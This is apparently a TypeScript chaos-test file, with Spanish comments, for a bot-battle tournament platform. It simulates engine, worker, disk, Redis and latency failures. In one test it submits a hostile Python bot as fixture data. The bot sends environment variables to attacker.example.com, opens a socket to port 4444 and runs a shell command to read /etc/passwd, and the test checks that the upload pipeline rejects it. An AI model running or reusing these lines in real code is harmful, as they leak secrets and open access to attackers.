/**
 * E12 · T12.3 — Game day M3 (el primero desde M3), automatizado y repetible.
 *
 * Cada guion (docs/gamedays/README.md) define su COMPORTAMIENTO ESPERADO antes
 * de ejecutarse (referencia del dosier: 9.4, 19.2, 24) y este test comprueba el
 * RESULTADO OBSERVADO con piezas reales. Las desviaciones que encuentre este
 * archivo son las que el acta convierte en issues con equipo asignado.
 *
 * Cubiertos en proceso: GD-1 (matar motor), GD-2 (matar worker con cola llena),
 * GD-3 (disco de replays lleno), GD-4 (caída de Redis), GD-6 (latencia extrema
 * en la red arena) y GD-7 (bot hostil nuevo). GD-5 (caída de PostgreSQL) exige
 * staging con Docker y queda documentado en el acta.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readFileSync } from "node:fs";
import request from "supertest";
import type { Express } from "express";
import { WebSocket } from "ws";

import { startTestDb, type TestDbHandle } from "../../apps/api/src/testing/test-db.js";
import { seedDev, DEV_USERS } from "../../apps/api/src/db/seeds/dev.js";
import { tokenFor } from "../../apps/api/src/testing/helpers.js";
import { createApp } from "../../apps/api/src/app.js";
import { E6PipelineBotManager } from "../../apps/api/src/services/e6-bot-manager.js";
import { enqueueJob, claimJob } from "../../apps/tournament-worker/src/queue.js";
import { TournamentWorker } from "../../apps/tournament-worker/src/worker.js";
import { makeRunBattleHandler, markBattleForReview, type BattleContext, type BattleExecution } from "../../apps/tournament-worker/src/battle-runner.js";
import { InfrastructureFailure } from "../../apps/tournament-worker/src/errors.js";
import { createBots, insertScheduledBattle, type TestBot } from "../../apps/tournament-worker/src/testing/fixtures.js";
import { RedisSignal } from "../../apps/tournament-worker/src/redis-signal.js";
import { loadRuleset } from "../../packages/game-rules/index.js";
import { initPhysics } from "../../apps/arena-engine/src/sim/physics.js";
import { Battle } from "../../apps/arena-engine/src/sim/battle.js";
import { emptyArena, gunnerLoadout, scoutLoadout } from "../../apps/arena-engine/src/fixtures.js";
import { HunterBot } from "../../apps/arena-engine/src/stubs.js";
import { ProtocolServer, type ExpectedBot } from "../../apps/arena-engine/src/protocol-server.js";

let h: TestDbHandle;
let app: Express;
let bots: TestBot[];

const LOADOUT = JSON.parse(
  readFileSync(join(import.meta.dirname, "..", "..", "packages", "module-catalog", "examples", "loadout-medium-gunner.json"), "utf8"),
);

/** Ejecutor guionizado (equipo A gana); cuenta ejecuciones por batalla. */
function countingExecutor(log: Map<string, number>, fail?: (ctx: BattleContext) => void) {
  return async (ctx: BattleContext): Promise<BattleExecution> => {
    log.set(ctx.battle.id, (log.get(ctx.battle.id) ?? 0) + 1);
    fail?.(ctx);
    return {
      winner: "A", ticks: 100, score: { A: 3, B: 1 },
      finalStateHash: `hash-${ctx.battle.id}`, disqualified: [], versions: { engine: "gameday" },
    };
  };
}

function workerWith(executor: ReturnType<typeof countingExecutor>, workerId: string, replaysDir?: string) {
  return new TournamentWorker({
    db: h.db,
    workerId,
    handlers: { run_battle: makeRunBattleHandler({ executor, replaysDir }) },
    onExhausted: (job) => markBattleForReview(h.db, job),
    lockTimeoutMs: 1000,
  });
}

beforeAll(async () => {
  await initPhysics();
  h = await startTestDb();
  await seedDev(h.db);
  app = createApp({ db: h.db, botManager: new E6PipelineBotManager(h.db), anonQuota: { max: 10_000, windowMs: 3600_000 } });
  bots = await createBots(h.db, 4, "gd");
}, 180_000);

afterAll(async () => {
  await h?.stop();
});

describe("Game day M3 · guiones de caos con comportamiento esperado predefinido", () => {
  // ── GD-1 · matar el motor a mitad de batalla de torneo ────────────────────
  it("GD-1: el motor muere una vez → fallo de infraestructura, reintento y la batalla termina (19.2)", async () => {
    const log = new Map<string, number>();
    let killed = false;
    const executor = countingExecutor(log, () => {
      if (!killed) {
        killed = true;
        throw new InfrastructureFailure("engine_start_failure", "motor muerto (inyección GD-1)");
      }
    });
    const id = await insertScheduledBattle(h.db, bots[0], bots[1], { seed: "gd1" });
    await enqueueJob(h.db, "run_battle", { battleId: id }, { dedupeKey: `gd1:${id}` });
    const w = workerWith(executor, "gd1-worker");
    // Primer drain: el motor muere, la batalla vuelve a scheduled.
    await w.drain(1);
    let b = await h.db("battles").where({ id }).first();
    expect(b.status).toBe("scheduled");
    // Segundo drain tras el lock timeout: reintenta y termina.
    await w.drain(1000, new Date(Date.now() + 5_000));
    b = await h.db("battles").where({ id }).first();
    expect(b.status).toBe("finished");
    expect(log.get(id)).toBe(2); // se ejecutó dos veces (1 fallida + 1 buena), no más
  });

  // ── GD-2 · matar el worker con la cola llena (variante MOTOR REAL) ─────────
  it("GD-2: worker muerto con 12 batallas encoladas (una huérfana) → un worker nuevo termina todas exactamente una vez", async () => {
    const log = new Map<string, number>();
    const ids: string[] = [];
    for (let i = 0; i < 12; i++) {
      const id = await insertScheduledBattle(h.db, bots[i % 2], bots[2 + (i % 2)], { seed: `gd2-${i}` });
      ids.push(id);
      await enqueueJob(h.db, "run_battle", { battleId: id }, { dedupeKey: `gd2:${id}` });
    }
    const w1 = workerWith(countingExecutor(log), "gd2-w1");
    await w1.drain(5); // procesa 5 y "muere"
    // Una batalla queda reclamada a medias por el worker muerto.
    const orphan = await claimJob(h.db, { workerId: "gd2-w1-muerto", kinds: ["run_battle"] });
    expect(orphan).not.toBeNull();

    const w2 = workerWith(countingExecutor(log), "gd2-w2");
    await w2.drain(1000, new Date(Date.now() + 5_000)); // > lockTimeout: recupera la huérfana

    for (const id of ids) {
      const b = await h.db("battles").where({ id }).first();
      expect(b.status).toBe("finished"); // ninguna perdida
      expect(log.get(id)).toBe(1); // ninguna dos veces
      const follow = await h.db("jobs").where({ dedupe_key: `process_result:${id}` });
      expect(follow.length).toBe(1);
    }
    const stuck = await h.db("jobs").whereIn("status", ["queued", "running"]).where("kind", "run_battle");
    expect(stuck.length).toBe(0);
  });

  // ── GD-3 · llenar el disco de replays ─────────────────────────────────────
  it("GD-3: no se puede escribir el replay → infraestructura, la batalla NO queda 'finished' sin replay (19.2/23.1)", async () => {
    // replaysDir apunta BAJO un archivo: mkdir/writeFile fallan (ENOTDIR), como un disco lleno.
    const fileAsDir = join(mkdtempSync(join(tmpdir(), "gd3-")), "occupied");
    writeFileSync(fileAsDir, "no soy un directorio");
    const replaysDir = join(fileAsDir, "replays");

    const log = new Map<string, number>();
    // El ejecutor entrega un replay REAL para forzar la escritura a disco.
    const executor = async (ctx: BattleContext): Promise<BattleExecution> => {
      log.set(ctx.battle.id, (log.get(ctx.battle.id) ?? 0) + 1);
      return {
        winner: "A", ticks: 10, score: { A: 1, B: 0 },
        finalStateHash: "h", disqualified: [], versions: { engine: "gameday" },
        replayJsonl: '{"header":{}}\n',
      };
    };
    const id = await insertScheduledBattle(h.db, bots[0], bots[1], { seed: "gd3" });
    await enqueueJob(h.db, "run_battle", { battleId: id }, { dedupeKey: `gd3:${id}` });
    const w = new TournamentWorker({
      db: h.db, workerId: "gd3-w",
      handlers: { run_battle: makeRunBattleHandler({ executor, replaysDir }) },
      onExhausted: (job) => markBattleForReview(h.db, job),
      lockTimeoutMs: 1000,
    });
    // El handler revienta al escribir el replay: el error se clasifica y la
    // batalla queda para REVISIÓN MANUAL (failed/infrastructure), nunca
    // 'finished' con un resultado sin replay oficial (23.1).
    const processed = await w.drain(1);
    expect(processed).toBe(1);
    const b = await h.db("battles").where({ id }).first();
    expect(b.status).not.toBe("finished");
    expect(b.status).toBe("failed");
    expect(b.failure_kind).toBe("infrastructure");
  });

  // ── GD-4 · caída de Redis ─────────────────────────────────────────────────
  it("GD-4: Redis caído → connect() falla, pero el worker sigue procesando por polling de la BD", async () => {
    // Redis en un puerto muerto: la conexión se rechaza.
    const signal = new RedisSignal("redis://127.0.0.1:1"); // puerto reservado, nadie escucha
    await expect(signal.connect()).rejects.toBeTruthy();

    // Sin timbre, la cola (que vive en PostgreSQL) sigue funcionando: drain no usa Redis.
    const log = new Map<string, number>();
    const id = await insertScheduledBattle(h.db, bots[0], bots[1], { seed: "gd4" });
    await enqueueJob(h.db, "run_battle", { battleId: id }, { dedupeKey: `gd4:${id}` });
    const w = workerWith(countingExecutor(log), "gd4-w");
    const processed = await w.drain(10);
    expect(processed).toBeGreaterThan(0);
    const b = await h.db("battles").where({ id }).first();
    expect(b.status).toBe("finished");
  });

  // ── GD-6 · latencia extrema en la red arena ───────────────────────────────
  it("GD-6: un bot con latencia por encima de la ventana → acción segura, DQ por timeouts y la batalla termina (9.4/D2)", async () => {
    const ruleset = loadRuleset("dm_practice@1", { timeLimitTicks: 400, maxConsecutiveTimeouts: 5 });
    const battle = await Battle.create({
      battleId: "gd6_" + Math.random().toString(36).slice(2),
      seed: "gd6", ruleset, map: emptyArena(),
      participants: [
        { id: "veh_1", botId: "bot_lag", team: "red", spec: scoutLoadout() },
        { id: "veh_2", botId: "bot_ok", team: "blue", spec: gunnerLoadout() },
      ],
    });
    battle.attachBot("veh_2", new HunterBot("bot_ok")); // el rival sí responde
    const expected: ExpectedBot[] = [{ botId: "bot_lag", vehicleId: "veh_1", battleToken: "t".repeat(16) }];
    const server = new ProtocolServer({ battle, catalogVersion: "mvp@1", expected, tickIntervalMs: 2, decisionDeadlineMs: 10 });
    server.start();
    try {
      const ws = new WebSocket(`ws://127.0.0.1:${server.port}`);
      await new Promise<void>((res, rej) => { ws.once("open", () => res()); ws.once("error", rej); });
      let welcomed = false;
      ws.on("message", (raw) => {
        const msg = JSON.parse(String(raw));
        if (msg.type === "WELCOME") welcomed = true;
        // Latencia extrema: NUNCA respondemos a las OBSERVATION dentro de la ventana.
      });
      ws.send(JSON.stringify({ proto: "arena/1", type: "HELLO", seq: 1, payload: { botId: "bot_lag", botVersion: "1.0.0", sdk: { name: "custom", version: "0" }, battleToken: "t".repeat(16) } }));

      const result = await server.waitForResult();
      expect(welcomed).toBe(true);
      expect(result.disqualified).toContain("veh_1"); // descalificado por timeouts consecutivos
      expect(result.ticks).toBeGreaterThan(0); // el motor NO se detuvo
      ws.close();
    } finally {
      server.stop();
      battle.free();
    }
  }, 20_000);

  // ── GD-7 · bot hostil NUEVO (ajeno a E6) ──────────────────────────────────
  it("GD-7: un bot hostil escrito por E12 (sockets/subprocess/exfiltración) es RECHAZADO por el pipeline y la plataforma sigue", async () => {
    const dev = await tokenFor(h.db, DEV_USERS.developer);
    const auth = { Authorization: `Bearer ${dev}` };

    // Bot hostil nuevo: NO usa fixtures de E6 (regla de independencia de la DoD).
    // Exfiltra por HTTP con `requests` (paquete de terceros FUERA de la allowlist):
    // ese import es un motivo de RECHAZO real en el análisis estático (a diferencia
    // de socket/subprocess de stdlib, que solo se SEÑALAN como hallazgo — ver la
    // sección de hallazgos de docs/entrega-E12.md y el acta del game day).
    const hostileFiles = [
      { path: "requirements.txt", content: "arena-sdk==1.0.0\nrequests==2.31.0\n" },
      { path: "requirements.lock", content: "arena-sdk==1.0.0\nrequests==2.31.0\n" },
      { path: "manifest.json", content: JSON.stringify({ runtime: "python", entry: "src/bot.py" }) },
      {
        path: "src/bot.py",
        content: [
          "import os",
          "import socket        # exfiltración de red (stdlib: solo señalado)",
          "import subprocess    # ejecución de comandos (stdlib: solo señalado)",
          "import requests      # HTTP de terceros: FUERA de la allowlist → rechazo",
          "from arena_sdk import Bot",
          "",
          "class EvilBot(Bot):",
          "    def decide(self, obs):",
          "        s = socket.socket()",
          "        s.connect(('attacker.example.com', 4444))",
          "        requests.post('http://attacker.example.com', data=dict(os.environ))",
          "        subprocess.Popen(['/bin/sh', '-c', 'cat /etc/passwd'])",
          "        return {'forTick': obs['tick']}",
          "",
        ].join("\n"),
      },
    ];

    const bot = await request(app).post("/bots").set(auth).send({ name: "gd7-hostil" });
    expect(bot.status).toBe(201);
    await request(app).post(`/bots/${bot.body.id}/loadouts`).set(auth).send(LOADOUT);
    const version = await request(app)
      .post(`/bots/${bot.body.id}/versions`).set(auth)
      .field("runtime", "python").field("loadoutRevision", "1")
      .attach("source", Buffer.from(JSON.stringify({ files: hostileFiles })), "package.json");
    expect(version.status).toBe(201);
    const submit = await request(app).post(`/bots/${bot.body.id}/versions/${version.body.version}/actions/submit`).set(auth);
    expect(submit.status).toBe(202);
    expect(submit.body.status).toBe("failed"); // rechazado ANTES de ejecutarse
    const byName = Object.fromEntries(submit.body.stages.map((s: any) => [s.name, s.status]));
    expect(byName.static_analysis).toBe("failed"); // el análisis estático lo pilla

    const v = await h.db("bot_versions").where({ bot_id: bot.body.id, version: version.body.version }).first();
    expect(v.state).toBe("rejected");
    expect(v.rejection_reason).toBeTruthy();

    // La plataforma sigue operando: un bot legítimo posterior SÍ valida.
    const good = await request(app).post("/bots").set(auth).send({ name: "gd7-legitimo" });
    await request(app).post(`/bots/${good.body.id}/loadouts`).set(auth).send(LOADOUT);
    const { pyGoodFiles } = await import("../../apps/bot-manager/tests/fixtures.js");
    const gv = await request(app)
      .post(`/bots/${good.body.id}/versions`).set(auth)
      .field("runtime", "python").field("loadoutRevision", "1")
      .attach("source", Buffer.from(JSON.stringify({ files: pyGoodFiles() })), "package.json");
    const gs = await request(app).post(`/bots/${good.body.id}/versions/${gv.body.version}/actions/submit`).set(auth);
    expect(gs.body.status).toBe("passed");
  });
});
